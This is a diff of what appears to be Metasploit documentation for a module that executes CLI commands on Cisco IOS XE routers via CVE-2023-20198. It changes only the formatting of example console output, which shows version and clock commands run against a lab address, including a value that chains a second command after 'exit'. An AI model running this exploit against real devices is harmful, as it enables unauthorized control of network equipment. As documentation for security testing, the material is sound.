@@ -88,58 +88,58 @@ View the full module info with the info, or info -d command.
 msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run
 [*] Running module against 192.168.86.57
 
-[*] 
-**CLI Line # 2: Cisco IOS XE Software, Version 16.12.03
-**CLI Line # 2: Cisco IOS Software [Gibraltar], Virtual XE Software (X86_64_LINUX_IOSD-UNIVERSALK9-M), Version 16.12.3, RELEASE SOFTWARE (fc5)
-**CLI Line # 2: Technical Support: http://www.cisco.com/techsupport
-**CLI Line # 2: Copyright (c) 1986-2020 by Cisco Systems, Inc.
-**CLI Line # 2: Compiled Mon 09-Mar-20 21:50 by mcpre
-**CLI Line # 2: Cisco IOS-XE software, Copyright (c) 2005-2020 by cisco Systems, Inc.
-**CLI Line # 2: All rights reserved.  Certain components of Cisco IOS-XE software are
-**CLI Line # 2: licensed under the GNU General Public License ("GPL") Version 2.0.  The
-**CLI Line # 2: software code licensed under GPL Version 2.0 is free software that comes
-**CLI Line # 2: with ABSOLUTELY NO WARRANTY.  You can redistribute and/or modify such
-**CLI Line # 2: GPL code under the terms of GPL Version 2.0.  For more details, see the
-**CLI Line # 2: documentation or "License Notice" file accompanying the IOS-XE software,
-**CLI Line # 2: or the applicable URL provided on the flyer accompanying the IOS-XE
-**CLI Line # 2: software.
-**CLI Line # 2: ROM: IOS-XE ROMMON
-**CLI Line # 2: router uptime is 3 hours, 59 minutes
-**CLI Line # 2: Uptime for this control processor is 4 hours, 2 minutes
-**CLI Line # 2: System returned to ROM by reload
-**CLI Line # 2: System image file is "bootflash:packages.conf"
-**CLI Line # 2: Last reload reason: reload
-**CLI Line # 2: This product contains cryptographic features and is subject to United
-**CLI Line # 2: States and local country laws governing import, export, transfer and
-**CLI Line # 2: use. Delivery of Cisco cryptographic products does not imply
-**CLI Line # 2: third-party authority to import, export, distribute or use encryption.
-**CLI Line # 2: Importers, exporters, distributors and users are responsible for
-**CLI Line # 2: compliance with U.S. and local country laws. By using this product you
-**CLI Line # 2: agree to comply with applicable laws and regulations. If you are unable
-**CLI Line # 2: to comply with U.S. and local laws, return this product immediately.
-**CLI Line # 2: A summary of U.S. laws governing Cisco cryptographic products may be found at:
-**CLI Line # 2: http://www.cisco.com/wwl/export/crypto/tool/stqrg.html
-**CLI Line # 2: If you require further assistance please contact us by sending email to
-**CLI Line # 2: export@cisco.com.
-**CLI Line # 2: License Level: ax
-**CLI Line # 2: License Type: N/A(Smart License Enabled)
-**CLI Line # 2: Next reload license Level: ax
-**CLI Line # 2: Smart Licensing Status: UNREGISTERED/No Licenses in Use
-**CLI Line # 2: cisco CSR1000V (VXE) processor (revision VXE) with 1113574K/3075K bytes of memory.
-**CLI Line # 2: Processor board ID 9OVFUOGPESO
-**CLI Line # 2: 4 Gigabit Ethernet interfaces
-**CLI Line # 2: 32768K bytes of non-volatile configuration memory.
-**CLI Line # 2: 3012164K bytes of physical memory.
-**CLI Line # 2: 6188032K bytes of virtual hard disk at bootflash:.
-**CLI Line # 2: 0K bytes of WebUI ODM Files at webui:.
-**CLI Line # 2: Configuration register is 0x2102
+
+Cisco IOS XE Software, Version 16.12.03
+Cisco IOS Software [Gibraltar], Virtual XE Software (X86_64_LINUX_IOSD-UNIVERSALK9-M), Version 16.12.3, RELEASE SOFTWARE (fc5)
+Technical Support: http://www.cisco.com/techsupport
+Copyright (c) 1986-2020 by Cisco Systems, Inc.
+Compiled Mon 09-Mar-20 21:50 by mcpre
+Cisco IOS-XE software, Copyright (c) 2005-2020 by cisco Systems, Inc.
+All rights reserved.  Certain components of Cisco IOS-XE software are
+licensed under the GNU General Public License ("GPL") Version 2.0.  The
+software code licensed under GPL Version 2.0 is free software that comes
+with ABSOLUTELY NO WARRANTY.  You can redistribute and/or modify such
+GPL code under the terms of GPL Version 2.0.  For more details, see the
+documentation or "License Notice" file accompanying the IOS-XE software,
+or the applicable URL provided on the flyer accompanying the IOS-XE
+software.
+ROM: IOS-XE ROMMON
+router uptime is 3 hours, 59 minutes
+Uptime for this control processor is 4 hours, 2 minutes
+System returned to ROM by reload
+System image file is "bootflash:packages.conf"
+Last reload reason: reload
+This product contains cryptographic features and is subject to United
+States and local country laws governing import, export, transfer and
+use. Delivery of Cisco cryptographic products does not imply
+third-party authority to import, export, distribute or use encryption.
+Importers, exporters, distributors and users are responsible for
+compliance with U.S. and local country laws. By using this product you
+agree to comply with applicable laws and regulations. If you are unable
+to comply with U.S. and local laws, return this product immediately.
+A summary of U.S. laws governing Cisco cryptographic products may be found at:
+http://www.cisco.com/wwl/export/crypto/tool/stqrg.html
+If you require further assistance please contact us by sending email to
+export@cisco.com.
+License Level: ax
+License Type: N/A(Smart License Enabled)
+Next reload license Level: ax
+Smart Licensing Status: UNREGISTERED/No Licenses in Use
+cisco CSR1000V (VXE) processor (revision VXE) with 1113574K/3075K bytes of memory.
+Processor board ID 9OVFUOGPESO
+4 Gigabit Ethernet interfaces
+32768K bytes of non-volatile configuration memory.
+3012164K bytes of physical memory.
+6188032K bytes of virtual hard disk at bootflash:.
+0K bytes of WebUI ODM Files at webui:.
+Configuration register is 0x2102
 
 [*] Auxiliary module execution completed
 msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > run CMD="exit\\nshow clock"
 [*] Running module against 192.168.86.57
 
-[*] 
-**CLI Line # 2: *15:24:05.110 UTC Fri Nov 3 2023
+
+*15:24:05.110 UTC Fri Nov 3 2023
 [*] Auxiliary module execution completed
 msf6 auxiliary(admin/http/cisco_ios_xe_cli_exec_cve_2023_20198) > 
 ```
